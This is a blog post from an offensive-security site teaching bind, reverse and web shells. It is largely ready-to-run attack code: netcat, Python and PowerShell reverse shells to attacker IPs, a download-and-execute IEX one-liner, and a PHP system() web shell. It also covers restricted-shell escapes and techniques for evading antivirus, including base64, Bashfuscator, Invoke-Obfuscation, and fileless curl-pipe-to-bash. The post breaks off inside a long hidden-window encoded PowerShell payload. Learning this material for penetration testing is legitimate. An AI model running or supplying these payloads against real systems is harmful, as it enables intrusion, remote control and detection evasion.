---
title: Shells
date: 2025-09-26 15:00:00 +0000
categories:
  - Tricks
lang: en
tags:
  - netcat
  - bash
  - socat
  - encrypted shell
  - openssl
  - shells
  - obfuscation
  - linux
  - windows
description: How you can use shells effectively
image:
  path: /assets/img/images/posts/shells/shell.png
  alt: A literal shell XD
---

Hi, my name is Luis. I'm a security enthusiast so with that in mind I decided to create **pwnarchive**, This is my first post here, and Iâ€™ve decided to keep it simple by starting with something seemingly trivial as shells. They may look basic, but knowing about them is fundamental.

I created **pwnarchive** as a personal logbook a place to capture what Iâ€™ve learned, share techniques I find useful, and show machines or challenges I've done. Over time, Iâ€™ll expand it with more content ranging from quick notes and miscellaneous tips to deeper dives into offensive security concepts.

Without further ado, I welcome you to **pwnarchive**. I hope you enjoy the read :)  


>**Note:**  
>I wonâ€™t be covering Metasploit here, itâ€™d make the post much longer. This post is focused on simple, manual techniques and isnâ€™t meant to be an inâ€‘depth guide on shells. Maybe Iâ€™ll dive into Metasploit in a future post ðŸ¤”
{: .prompt-info }

## So... what is a shell?
A shell is a program that provides you an interface with the operating system, allowing you to instruct the system to perform actions, these actions are what we call **commands**.   


>ðŸ’¡**Fun fact:**  
The shell serves as an intermediary between the **you** and the **kernel**, translating human readable instructions into system level operations. Its name comes from its role as an outer layer that surrounds the operating systemâ€™s core (the **kernel**) giving us a way to interact with it.
{: .prompt-info }

>**Why should I care?**  
>We care about shells because, once we gain remote access to a shell on the target operating system, we obtain direct access to the **file system** and the **OS itself**, allowing us to execute commands and potentially launch further attacks.
{: .prompt-tip }  

## Difference between shell and terminal

Theyâ€™re not the same thing, and itâ€™s easy to get them mixed up. I know because Iâ€™ve confused them before. Hereâ€™s a simple way to think about it

| Component    | Role                                                                                                                                                                                              |
| ------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Terminal** | A terminal is a text-based interface that establishes an input/output channel between the user and the shell. It captures keystrokes, sends them to the shell, and displays the resulting output. |
| **Shell**    | The command-line interpreter that parses what you type and executes programs or scripts.                                                                                                          |

>ðŸ’¡**Another Fun fact  
>(Why do I feel this might become a common thing? ðŸ˜†)**  
>Before personal computers were a thing, people used physical terminals,  just a keyboard and screen connected to a mainframe, sending keystrokes and showing output. Today, when you open a terminal on your laptop, youâ€™re really using a **terminal emulator** software that mimics a terminal.
{: .prompt-info }


>**TLDR**  
>The terminal is the interface you see, while the shell is the interpreter behind it.  
{: .prompt-tip }

### Shells vs Remote Graphical Interfaces

| Aspect                | Shells (Reverse/Bind)                                                                                     | RDP / VNC                                                                                                                                |
| --------------------- | --------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| **Footprint**         | Lightweight minimal resource usage                                                                        | Heavy, higher CPU/memory usage                                                                                                           |
| **User Visibility**   | Runs silently in the background; user is usually unaware, unless monitoring tools are in place.           | Visible desktop session, user may notice mouse/keyboard activity                                                                         |
| **Network Signature** | Can use simple TCP/UDP can be tunneled/obfuscated (HTTPS, DNS, ICMP, etc.) to blend with normal traffic.  | Uses well-known ports, easily flagged by IDS/IPS traffic patterns are recognizable and even when encrypted can still be fingerprintable. |
| **Logging**           | May appear only as a spawned process with a network connection depends on OS auditing and EDR visibility. | Session start/stop, authentication attempts, and activity are logged by OS                                                               |
| **Detection**         | Harder to detect without process/network correlation monitoring, stealthier if tunneled.                  | Easier to detect. many SIEM/EDR tools have built-in rules for RDP/VNC anomalies.                                                         |
| **Automation**        | Easier and faster                                                                                         | Posible but may need some setup less reliable and slower than shells                                                                     |

### *But before we talk more about shells...*
---

## What is a payload
A payload is the code delivered after exploiting a vulnerability that performs an action for the attacker, with **one of the most common actions being to grant a shell**.

## What is a exploit
We can say that an exploit is a piece of code, script, or technique that takes advantage of a vulnerability in a system, application, or service. Its purpose is to **gain control or access** by abusing that weakness.

### Payload vs exploit

| Term        | Definition                                                                               | Purpose                                                                                            | Examples                                              |
| ----------- | ---------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------- | ----------------------------------------------------- |
| **Exploit** | Code, script, or technique that abuses a vulnerability in software, services, or systems | To gain execution or  access by leveraging a weakness                                              | Buffer overflow, SQL injection, remote code execution |
| **Payload** | The code delivered and executed after the exploit succeeds                               | To perform the attackerâ€™s intended action once access is obtained like getting a shell for example | getting a shell, keylogger, backdoor                  |

>**TLDR**  
>an exploit is the method used to **gain access**
>a payload is the **action performed once access is gained**
{: .prompt-tip }

#### Before getting a shell

When preparing to establish a shell session on a target, itâ€™s important to first understand the environment youâ€™re interacting with. (You should already know that from the enumeration process), but the options you have for spawning or upgrading a shell will depend on things like

- **Operating system and version**  
  Different platforms (Windows, Linux, macOS, BSD, etc.) ship with their own default tools, utilities, and behaviors.

- **Available interpreters and runtimes**  
  The presence of scripting languages (e.g., Python, PowerShell, Perl) or even just a minimal command shell determines which upgrade or interaction methods are possible.

- **System role and context**  
  A workstation, web server, or database host may enforce different restrictions, monitoring, or installed binaries depending on its purpose in the network.

- **Access limitations**  
  User privileges, sandboxing, or endpoint security controls can all influence what kind of shell you can establish or how you can upgrade it.

By being aware of these aspects of the target system, you can select the most effective and reliable method for obtaining and maintaining a shell session.

with that being said lets talk about the types of shell we have...

## Bind shells

A bind shell is a type of shell where the attacker via a payload opens a network port on the victimâ€™s machine and the victim machine then waits for an incoming connection from the attacker. 

In this setup, the attacker connects directly to the targetâ€™s IP address and the listening port.

### ***Demo***
---
1. **target** (here we open a port in the target machine)
 
![[receiving-bind.gif]]({{ "assets/img/images/posts/shells/receiving-bind.gif" | relative_url }}){: width="85%" } 


1. **attacker** connects to the previously opened port `4444` on the victim (See previous image)

![[sending-bind.gif ]]({{ "assets/img/images/posts/shells/sending-bind.gif" | relative_url }}){: width="85%" }

 **Result:** you gain an shell on the target and now can execute commands on their machine

---

`you might be thinking: that sounds great doesn't it?!! you just connect to the target and...`

![[Pasted image 20250922195953.png]]({{ "assets/img/images/posts/shells/jerry.png" | relative_url }}){: width="75%" }

## The problem with bind shells

| Challenge                  | Why Itâ€™s a Problem                                                                                                                                 |
| -------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Firewall restrictions**  | Network administrators usually enforce strict inbound firewall rules and NAT/PAT on the network edge, making it difficult to connect from outside. |
| **Internal access needed** | Because inbound traffic is blocked, an attacker often needs to already have internal network access to connect to a bind shell.                    |
| **OS-level firewalls**     | Host-based firewalls (Windows Defender Firewall, iptables, etc.) typically block unsolicited inbound connections unless explicitly allowed.        |

---

Now ladies and gentleman, without further ado I present to you the solution to these issues ðŸŽ‰

![Deal or No Deal GIF](https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExdTZ2Z28wMDlwZ2ZuajR1amZ0aXJkbmJ1MHI4aWt4ZWNtZnAzM3RqaiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/8FVrv9DcKA9SPROI8V/giphy.gif)

**PS: I know you were all hoping for this ;)**

## Enter Reverse Shells

### So what is a reverse shell?
A reverse shell is a type of remote shell connection where the **target machine initiates the connection back to the attackerâ€™s machine**, instead of the attacker connecting directly to the target.

**attacker side (we are listening)**

```bash
# nc -lvnp â†’ sets up netcat to
# -l (listen), -v (verbose, shows connection details and status messages), -n (no dns resolution, faster and avoids name lookups), -p (set port)
user@pwnarchive:~$ nc -lvnp 6789
```
{: .nolineno }


**target side (connects back to us)**

```bash
# rm -f /tmp/f â†’ deletes /tmp/f if it already exists.

# mkfifo /tmp/f â†’ creates a named pipe (FIFO) at /tmp/f.

# cat /tmp/f | /bin/bash -i 2>&1 â†’ reads commands from the pipe and feeds them into an interactive Bash shell, sending both stdout and stderr back out.

# | nc 10.0.5.4 6789 > /tmp/f â†’ connects to the attackerâ€™s machine at 10.0.5.4:1337 with netcat, sends the shellâ€™s output there, and writes whatever comes back into the FIFO (so Bash reads it).
user@target:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.0.5.4 6789 > /tmp/f
```
{: .nolineno }

**Result:** you get a connection back and now can execute commands!

![[Pasted image 20250923120933.png]]({{ "assets/img/images/posts/shells/reverseIlustration.png" | relative_url }}){: width="85%" }


>It works because stateful firewalls allow outbound connections by default, since users inside the network are expected to initiate sessions (like browsing the web or sending email). Once the outbound connection is established, the firewall tracks it in its state table and permits the return traffic, which is where the attackerâ€™s commands flow back.
{: .prompt-info }

### A quick pause, have you heard about interactive shells? what does that mean?

**An interactive shell**  
is the one you use when you open a terminal and start typing commands yourself. It shows you a prompt (`$` or `#`), waits for your input, and gives you feedback. you can think of it like a live conversation with the system, you ask, it answers. Because itâ€™s meant for people using it, it also loads useful things like aliases, environment variables, and reads your `~/.bashrc` so you get shortcuts and a nice working environment.

**A nonâ€‘interactive shell**  
on the other hand, doesnâ€™t expect you to sit there typing. Instead, it just runs commands automatically, usually from a script, a cron job, or some automated process. Thereâ€™s no prompt, no backâ€‘andâ€‘forth. It doesnâ€™t bother loading your interactive configs, because itâ€™s not meant for human interaction. It just executes what itâ€™s told and exits.

#### Quick tips to gain a nice and comfy interactive shell ;)

When you gain access to a system through a reverse shell, it may be unstable if it isnâ€™t interactive. This happens because the shell lacks a PTY (pseudoâ€‘terminal), so actions like pressing `Ctrl+C` can kill the entire session instead of just interrupting the running process.

> **What is a PTY?**  
> **A pseudo-terminal (pty) is a virtual terminal.**  It makes a program (like a shell) believe itâ€™s talking to a real terminal, but in reality another program is in control, sending input and capturing output. some examples of `control programs` include `ssh`, `xterm`, `gnome-terminal` and so on.
{: .prompt-info }

##### Why PTY matters in shells?

When you catch a reverse shell without a PTY (for example with `nc`), youâ€™re basically talking to a raw input/output stream which is why it you shell is limited and feels so weird. without a PTY you **cannot** do the following.

| Limitation                | Effect                                    |
| ------------------------- | ----------------------------------------- |
| No Job control            | No background/foreground tasks            |
| No Line editing           | No arrow keys, tab completion, or history |
| No proper Signal handling | `Ctrl+C` kills the whole session          |
| Some Command won't run    | `su`, `ssh`, `vim` may fail               |

So to be able to solve this once you get a shell you could use one of the following methods to get an interactive shell (for more methods please review the `useful tools` section on the bottom)

#### Python (Linux)

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
```
{: .nolineno }

---
#### ConPTYShell

You could useÂ the `Invoke-ConPtyShell`Â script, which can help when the windows shell does not open useful programs like (mimikatz, winpeas, etc.) or gives a weird behavior.

**On attacker side**

```bash
user@pwnarchive:~$ stty raw -echo; (stty size; cat) | nc -lvnp 6789
```
{: .nolineno }

This sets up a netcat listener on port `6789`

**On the target**

```powershell
PS C:\Users> IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.120 6789
```
{: .nolineno }

This command uses **`Invoke-WebRequest`** to download the `Invoke-ConPtyShell.ps1` script directly from GitHub and executes it in memory with **`Invoke-Expression`** (`IEX`). Once loaded, it calls **`Invoke-ConPtyShell`**, which establishes a reverse connection back to the attackerâ€™s machine at `10.0.0.120:6789`, providing a fully interactive Windows shell through `ConPTY`.

---
#### Another way of launching a interactive shell (Linux)

```zsh
# Launch a clean bash shell with output redirected to /dev/null
# This gives you a proper prompt like "user@hostname:~$"
# and redirects the output to /dev/null so no commands get logged
$ script /dev/null -c /bin/bash

# Suspend the current foreground process (reverse shell listener)
# Press Ctrl+Z â€” you'll see something like:
#   ^Z
#   zsh: suspended  nc -lvnp 4444

# 'stty raw -echo' disables line buffering and command echoing (for interactive input)
# 'fg' resumes the suspended shell
$ stty raw -echo; fg

# If the terminal looks broken or misaligned, reset it
# 'reset xterm' reinitializes terminal display
# 'export TERM=xterm' ensures proper terminal emulation
$ reset xterm; export TERM=xterm
```
{: .nolineno }

And Voila! thank me later.

Now with this changes you should be more comfortable in your current shell session.

---
## Web Shells

A `web shell` is a malicious script uploaded to a vulnerable web server that gives an attacker a **interface to execute commands** through a browser.

### Example of a webshell

Suppose we discover an **unrestricted file upload vulnerability**. To demonstrate its impact, we upload a simple PHP backdoor named `backdoor.php` and configure it to accept commands via the `0` GET parameter.

**Hereâ€™s an example payload**

```php
<?php
   system($_GET[0]);
?>
```


**We upload the `backdoor.php` file**

![[Pasted image 20250923072946.png]]({{ "assets/img/images/posts/shells/upload.png" | relative_url }})


>You could also use a webshell template like [pentestmonkeyâ€™s PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell) or [Antak WebShell](https://github.com/samratashok/nishang/tree/master/Antak-WebShell), depending on the target. Beyond PHP and ASPX, there are collections for many other technologies. If youâ€™re working in Kali Linux, you can also install the `webshells` package, which provides a list of webshells under `/usr/share/webshells/`.
{: .prompt-tip }


In this case, the backdoor executes any system command passed through the `0` parameter. For instance, accessing:

`http://target.com/backdoor.php?0=ls`

would run the `ls` command on the server, listing directory contents. This technique allows remote command execution **without requiring a direct shell connection**, leveraging PHPâ€™s `system()` function to interact with the underlying OS.

![[Pasted image 20250923072946.png]]({{ "assets/img/images/posts/shells/webshell.png" | relative_url }})

## Patience here is rewarded, so Iâ€™ll share a few of the tricks I have used in the past (just a small selection, not the whole list).

![Patrick GIF](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExbWt2aWVqbGp3MWg1aGwzNjNiY2o4cHc4OTUzNGhmam04MXRqdTZ3NCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/Dps6uX4XPOKeA/giphy.gif){: width="80%" }

>For more information you can also see the foot of this post which contains resources you can explore and check out more methods.  

### Restrictive enviroments

A restrictive enviroment is a lockedâ€‘down shell or system where common binaries are disabled, execution is limited, paths/permissions are constrained, and activity may be monitored or sandboxed to prevent easy escape or privilege escalation.

For more information about restricted shells (`rbash` especifically) visit [GNU The restricted shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html) for more binaries which can be used to escape a restricted shell check [GTFObins](https://gtfobins.github.io/#+shell)

#### Using `find -exec` To Launch A Shell

This method is particularly handy in restricted environments where common binaries (like `python`, `perl`, or `script`) may be missing or blocked. Since `find` is often available by default on Unixâ€‘like systems, it can be abused to spawn an interactive shell.


```bash
$ find . -exec /bin/sh \; -quit
```
{: .nolineno }


#### Using `awk` to escape a restricted shell


```bash
$ awk 'BEGIN {system("/bin/sh")}'
```
{: .nolineno }

---
### Encoding

#### Encoding a payload

Encoding is basically the process of taking data and changing how itâ€™s represented, usually so itâ€™s easier to store, send, or process. Think of it like saying the same thing but in another language, the meaning doesnâ€™t change, but the form does.

>Encoding is not encryption, it doesnâ€™t make data secret, just changes its form.
{: .prompt-warning }  

**original payload**

```bash
$ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.166.15.20",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
{: .nolineno }

**encoded payload**
`cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjYuMTUuMjAiLDk5OTkpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCIvYmluL2Jhc2giKSc=`

**payload being decoded and executed**

```bash
# 1. 'base64 -d' (this decodes the passed value)

# 2. '<<<' is a "here string" in Bash it is a operator that allows a string to be passed directly as standard input (stdin) to a command, similar to a pipe but more concise for short inputs

# 3. '| bash' we pipe the decoded payload to bash so it can get executed as a command and we should receive a shell
$ base64 -d <<< cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjYuMTUuMjAiLDk5OTkpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCIvYmluL2Jhc2giKSc= | bash
```
{: .nolineno }

Keep in mind that standard payloads like the one above are `pretty easy to catch`, because most modern security tools donâ€™t just look at the encoded string, theyâ€™ll actually decode it in memory and scan whatâ€™s really being executed.

In practice, this kind of encoding is used more often to **`prevent commands from breaking`** (for example, when special characters or tokens would otherwise cause issues during execution) than as a serious evasion technique.

##### In windows

this is easier with the `-e` parameter which executes an encoded command.

```powershell
PS C:\Users> powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMAAuADAALgAxADIAMAAiACwANgA3ADgAOQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```
{: .nolineno }

---
### Obfuscation
#### Linux

>**Signature**  
 means a **unique pattern** (byte sequence, text strings, or network behavior) that identifies a known piece of malware, exploit, or attack.
> 
>Antivirus software, IDS/IPS, and WAFs compare files or traffic against a **signature database**.
{: .prompt-tip }
  
Modern security tools rely heavily on **signature-based detection**. While this works well for known threats, it has a major weakness: if the signature changes, the detection often fails. This is where **obfuscation** can be helpful.

Obfuscation is the process of transforming code so that it looks completely different while still performing the same function.  
#### Obfuscation to bypass static analysis
##### Bashfuscator
There is a tool called [bashfuscator](https://github.com/Bashfuscator/Bashfuscator) which can be helpful in these cases it gives you the ability to bypass static detections on a Linux system

**Example**
![[Screenshot From 2025-09-23 23-49-25.png]]({{ "assets/img/images/posts/shells/bashfuscator.png" | relative_url }})

```
e${*//Z/\\}v${*#w}a\l "$(printf %s 'HSAB$}*H%*{$|}=//*{$")}.V//*{$;enod;}^^*{$"}]}^@{$Sk$}2#%*{$[dP{$" s% "f"t""nir\p od;]))02#4+)11#3--02#4(-(-([$ }OO%%@{$))))0#42+)1#42+0#15(-(-((($ ))))ed3b1#51+)8vh#85--qlp#43(-(-((($ ])2#71+)0#3*0#11(([$ "@$"]))11#2+)11#3--2#84(-(-([$ "},@{$")))11#4+)0#94*1#8-(((($ ni Sk rof;)w i h @$o "}]\V/@{$"m a}*{$(=dP($" s% ftni'"'"'r'"'"'p'|$'\x72ev'${@^^}${@^})"$@
```

This blob of text is command obfuscation, the attacker inserts redundant characters, parameter expansions, and escape sequences to disguise a simple payload.

Although it looks noisy, once normalized it reduces to the command `whoami`. The purpose of this obfuscation is to evade static, stringâ€‘based detection systems.

although in this example we just did a `whoami` , In practice the same approach could conceal more dangerous payloads, such as a reverse shell, if combined with a remote code execution vulnerability.

To avoid any errors you can encode to base64 and use the technique I showed you before

```bash
$ base64 -d <<< "ZSR7Ki8vWi9cXH12JHsqI3d9YVxsICIkKHByaW50ZiAlcyAnSFNBQiR9KkglKnskfH09Ly8qeyQiKX0uVi8vKnskO2Vub2Q7fV5eKnskIn1dfV5AeyRTayR9MiMlKnskW2RQeyQiIHMlICJmInQiIm5pclxwIG9kO10pKTAyIzQrKTExIzMtLTAyIzQoLSgtKFskIH1PTyUlQHskKSkpKTAjNDIrKTEjNDIrMCMxNSgtKC0oKCgkICkpKSllZDNiMSM1MSspOHZoIzg1LS1xbHAjNDMoLSgtKCgoJCBdKTIjNzErKTAjMyowIzExKChbJCAiQCQiXSkpMTEjMispMTEjMy0tMiM4NCgtKC0oWyQgIn0sQHskIikpKTExIzQrKTAjOTQqMSM4LSgoKCgkIG5pIFNrIHJvZjspdyBpIGggQCRvICJ9XVxWL0B7JCJtIGF9KnskKD1kUCgkIiBzJSBmdG5pJyInIidyJyInIidwJ3wkJ1x4NzJldicke0BeXn0ke0BefSkiJEA=" | bash
```
{: .nolineno }  

#### Some useful techniques

Another common technique during is to execute payloads **without writing them to disk**. by getting the payload from our hosted web server (This reduces detection and helps evade security tools that monitor file creation).

```bash
curl -s http://<IP or hostname>/you_hostedb64_payload.txt | base64 -d | bash
```
{: .nolineno }  

In addition to this we can also compress the payload and decompress before execution

```bash
curl -s https://<IP or hostname>/payload.gz.b64 | base64 -d | gunzip | bash
```
{: .nolineno }  

lastly we can also decrypt the payload once it reaches the target (it goes without mention that we have to encrypt the file before trying to use it)

```bash
curl -s https://<IP or hostname>/payload.enc | openssl enc -aes-256-cbc -d -k 'SecretKey' | bash
```


#### Windows
##### Invoke-Obfuscation
We can use [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) to obfuscate commands on windows

If we are on the downloaded directory, we can import `Invoke-Obfuscation` with

```powershell
PS C:\Users\Public> Import-Module Invoke-Obfuscation\Invoke-Obfuscation.psd1
```


**Running Invoke-Obfuscation**

```powershell
PS C:\Users\Public> Invoke-Obfuscation
```


To understand how to use the tool you can use the `TUTORIAL` option. 

![[Pasted image 20250923072946.png]]({{ "assets/img/images/posts/shells/tutorial_Invoke-Obfuscation.png" | relative_url }}){: width="85%" }

We do `SET SCRIPTBLOCK` and then we include the payload like this

![[Pasted image 20250923072946.png]]({{ "assets/img/images/posts/shells/scriptblock.png" | relative_url }}){: width="85%" }

>A ScriptBlock in PowerShell is simply a chunk of code enclosed in `{ }` braces that PowerShell treats as an object.
{: .prompt-info }

Based on this we can create a scriptblock which will contain our payload

```powershell
$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('10.0.0.120', 6789);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()
```
{: .nolineno }


We then have the following options

![[Pasted image 20250923072946.png]]({{ "assets/img/images/posts/shells/optionsInvoke.png" | relative_url }}){: width="85%" }

I decided to use `ALL` for this example

So you don't get lost my friend here I will give you a table that explains each option.

| Option       | What It Does                                                                                                          | Example Effect                                                  |
| ------------ | --------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------- |
| **TOKEN**    | Obfuscates PowerShell tokens (keywords, operators, cmdlets) by splitting, concatenating, or reordering them.          | `New-Object` â†’ `N`+`ew-Ob`+`ject`                               |
| **AST**      | Rewrites the Abstract Syntax Tree so the code structure changes but logic stays the same. Requires (PS 3.0+) to work. | Get-Process â†’<br>`&('Get'+'-Process')`<br>                      |
| **STRING**   | Obfuscates strings by breaking them apart, encoding, or concatenating.                                                | `"mimikatz"` â†’ `('mi'+'mi'+'k'+'atz')`                          |
| **ENCODING** | Encodes the entire command into another representation (Base64, Hex, Octal, Binary, etc.).                            | Command â†’ `powershell.exe -EncodedCommand <Base64>`             |
| **COMPRESS** | Compresses the command into a oneâ€‘liner and optionally wraps it in decompression logic.                               | Multiâ€‘line script â†’ compressed Gzip string executed at runtime. |
| **LAUNCHER** | Obfuscates how the command is **launched** (different PowerShell invocation syntaxes, argument tricks, etc.).         | `powershell.exe -NoP -W Hidden -Enc <payload>`                  |

![[Pasted image 20250923072946.png]]({{ "assets/img/images/posts/shells/tokenAllInvoke.png" | relative_url }}){: width="85%" }

after that we get the obfuscated value

![[Pasted image 20250923072946.png]]({{ "assets/img/images/posts/shells/InvokeObfuscationOUT.png" | relative_url }}){: width="85%" }

We copy to clipboard...

Then we can encode the command and run the following

```powershell
PS C:\Users\Public> powershell.exe -NoP -W Hidden -e JDVjbD1bVFlQRV0oIns1fXsyfXsxfXswfXszfXs0fXs2fXs3fSItZiAnVGhlblRJY2EnLCdJVFkuYXUnLCdzVGVtLnNlY3VyJywnVGlvJywnTi5Tc2xwcm8nLCdTWScsJ1RvQ28nLCdsUycpIDsgICRKNnlVSyAgPSAgW3RZUGVdKCJ7M317Mn17MX17MH0iIC1GJ2NPZElORycsJy5FTicsJ0VYdCcsJ3QnKSAgOyR7c3NgTGBQUk9gVE9jT0xTfSA9ICAoICAmKCdMcycpICgiezF9ezB9ezJ9ezN9Ii1mICdhcmlBYkxFJywndicsJzo1YycsJ0wnKSApLiJWYWBMVUUiOjoiVExzYDEyIjsgJHt0Y1BgY0xJRWBOVH0gPSAmKCJ7MH17MX17Mn0iLWYgJ05ldy1PJywnYmonLCdlY3QnKSAoIns2fXswfXs1fXszfXsyfXs0fXsxfSItZidlJywnaWVudCcsJ29ja2V0cy5UQ1AnLCdTJywnQ2wnLCd0LicsJ04nKSgoInsxfXsyfXswfSIgLWYnMC4xMjAnLCcxMCcsJy4wLicpLCA2Nzg5KTske25gZXRgd29Sa2BTdHJFQU19ID0gJHt0Q3BDYExJYGVOdH0uKCJ7Mn17MH17MX0iIC1mICd0cicsJ2VhbScsJ0dldFMnKS5JbnZva2UoKTske3NzTFNUcmBFYEFNfSA9IC4oInszfXsxfXsyfXswfSItZidjdCcsJ2UnLCd3LU9iamUnLCdOJykgKCJ7Mn17MX17NH17M317NX17MH0iIC1mICdtJywnZXQnLCdOJywndXJpdCcsJy5TZWMnLCd5LlNzbFN0cmVhJykoJHtuRWBUV2BvUmtzdFJlQU19LCR7RkFMYHNFfSwoeyR7dGBSdWV9fSAtYXMgW05ldC5TZWN1cml0eS5SZW1vdGVDZXJ0aWZpY2F0ZVZhbGlkYXRpb25DYWxsYmFja10pKTske3NTbFNUYFJFYEFtfS4oIns0fXsxfXsyfXswfXszfSIgLWYgJ3RpY2F0ZUFzQ2wnLCd0JywnaGVuJywnaWVudCcsJ0F1JykuSW52b2tlKCgiezJ9ezN9ezB9ezR9ezF9IiAtZidyZS1kbnMuYycsJ20nLCdjJywnbG91ZGZsYScsJ28nKSwke25gVWxsfSwke1NzbGBwck9UT2Bjb2BMc30sJHtGYEFgbHNlfSk7aWYoISR7U1NgbHNgVFJFYW19LiJpc2VuYGNgUllgcHRlRCIgLW9yICEke1NTTFNUYFJlYEFtfS4iaWBzc2lnbkVEIikgeyR7c1NMU2BUcmBFQU19LigiezF9ezB9Ii1mICdlJywnQ2xvcycpLkludm9rZSgpO2V4aXR9JHtzdGBSZWFNYFdSYGlgVEVyfSA9ICYoInsxfXsyfXswfSIgLWYgJ2N0JywnTmV3LU9iaicsJ2UnKSAoInsyfXszfXs0fXsxfXswfSIgLWYnaXRlcicsJ2FtV3InLCdJJywnTy4nLCdTdHJlJykoJHtTc2xTYFRyZWBBbX0pO2Z1bmN0aW9uIHdSaVRgZXRvc2BUUmVgQU0gKCR7U2BUUklgTkd9KSB7W2J5dGVbXV0ke1NgY2BSSXB0OmJgVWZmRXJ9ID0gJigiezB9ezF9ezJ9ezN9IiAtZidOZXcnLCctT2JqJywnZWMnLCd0JykgKCJ7M317Mn17MH17MX0iLWYndGVbJywnXScsJ2VtLkJ5JywnU3lzdCcpIDQwOTYgOyR7c1RSRUFgbXdSSWBUZXJ9LigiezF9ezB9Ii1mJ2l0ZScsJ1dyJykuSW52b2tl